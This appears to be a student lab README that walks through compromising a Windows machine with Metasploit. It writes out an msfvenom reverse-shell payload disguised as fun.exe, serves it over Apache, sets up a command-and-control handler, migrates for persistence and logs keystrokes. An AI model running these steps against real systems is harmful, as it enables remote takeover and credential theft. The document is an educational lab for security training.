# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="958" height="426" alt="VirtualBox_kali_ifconfig" src="https://github.com/user-attachments/assets/7ae77fd9-9188-4f41-85ce-330ba521c668" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="728" height="374" alt="Screenshot 2026-05-19 225333" src="https://github.com/user-attachments/assets/318ed4bf-6c51-4967-a585-5365f34803ee" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="723" height="80" alt="Screenshot 2026-05-19 225424" src="https://github.com/user-attachments/assets/476a44c2-be5a-4aab-ba63-e0d65d3ea4c7" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="720" height="64" alt="Screenshot 2026-05-19 225504" src="https://github.com/user-attachments/assets/0966e758-d872-489f-b16c-74f1e3da01e1" />


Check the status of apache2
## OUTPUT:

<img width="725" height="125" alt="Screenshot 2026-05-19 225540" src="https://github.com/user-attachments/assets/df1e9a59-cd6b-4e8a-b38b-abf27c20723b" />


Invoke msfconsole:
## OUTPUT:


<img width="719" height="560" alt="Screenshot 2026-05-19 225623" src="https://github.com/user-attachments/assets/dc32327e-e213-4333-b272-91689126c39c" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:


<img width="783" height="742" alt="image" src="https://github.com/user-attachments/assets/b01c5c49-bfdb-4905-96b9-92ce36ce11d7" />
Starting a command and control Server

use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="646" height="225" alt="image" src="https://github.com/user-attachments/assets/4a5e4446-d634-47d9-b322-2964738c3a73" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:


![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="713" height="635" alt="Screenshot 2026-02-11 094329" src="https://github.com/user-attachments/assets/88123881-e145-48a9-b990-5ae7a2be506a" />

On kali/parrot give the command exploit
## OUTPUT:



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:


<img width="422" height="173" alt="image" src="https://github.com/user-attachments/assets/9289513c-bb8a-4c6f-88c5-c7821838eccd" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:

<img width="783" height="681" alt="image" src="https://github.com/user-attachments/assets/b3559a50-e12e-443a-8b35-bcf969b0103e" />

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:


<img width="860" height="109" alt="image" src="https://github.com/user-attachments/assets/0105d394-11ca-4d2e-bba5-ad19a397cdaf" />


keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
